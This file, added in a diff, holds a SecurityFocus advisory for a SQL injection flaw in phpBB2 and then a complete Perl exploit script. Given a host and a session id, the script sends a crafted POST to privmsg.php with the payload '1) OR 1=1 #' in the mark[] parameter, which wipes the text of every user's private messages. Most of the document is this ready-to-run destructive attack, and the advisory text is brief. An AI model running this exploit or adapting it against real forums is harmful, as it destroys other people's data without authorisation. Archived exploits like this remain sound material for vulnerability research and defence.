@@ -1,0 +1,47 @@
+source: http://www.securityfocus.com/bid/6634/info
+
+A SQL injection vulnerability has been reported for phpBB2 systems that may result in the deletion of all private messages.
+
+phpBB2, in some cases, does not sufficiently sanitize user-supplied input which is used when constructing SQL queries to execute on the underlying database. As a result, it is possible to manipulate SQL queries. This may allow a remote attacker to modify query logic or potentially corrupt the database. 
+
+A remote attacker can exploit this vulnerability by manipulating URI parameters to cause the text of all private messages to be deleted.
+
+#!/usr/bin/perl --
+
+# phpBB delete the text of all users' private messages exploit
+# Ulf Harnhammar
+# January 2003
+
+use Socket;
+
+if (@ARGV != 2) { die "usage: $0 host sid\n"; }
+
+($host, $sid) = @ARGV;
+$host =~ s|\s+||g;
+$sid =~ s|\s+||g;
+
+$crlf = "\015\012";
+$http = "POST /privmsg.php?folder=inbox&sid=$sid HTTP/1.0$crlf".
+        "Host: $host$crlf".
+        "User-Agent: Mozzarella/1.37++$crlf".
+        "Referer: http://www.phpbb.com/$crlf".
+        "Connection: close$crlf".
+        "Content-Type: application/x-www-form-urlencoded$crlf".
+        "Content-Length: 58$crlf$crlf".
+        "mode=&delete=true&mark%5B%5D=1%29+OR+1%3D1+%23&confirm=Yes";
+
+$tcp = getprotobyname('tcp') or die "Couldn't getprotobyname!\n";
+$hosti = inet_aton($host) or die "Couldn't look up host!\n";
+$hosts = sockaddr_in(80, $hosti);
+
+socket(SOK, PF_INET, SOCK_STREAM, $tcp) or die "Couldn't socket!\n";
+connect(SOK, $hosts) or die "Couldn't connect to port!\n";
+
+select SOK; $| = 1; select STDOUT;
+
+print SOK $http;
+
+$junk = '';
+while (<SOK>) { $junk .= $_; }
+
+close SOK or die "Couldn't close!\n";
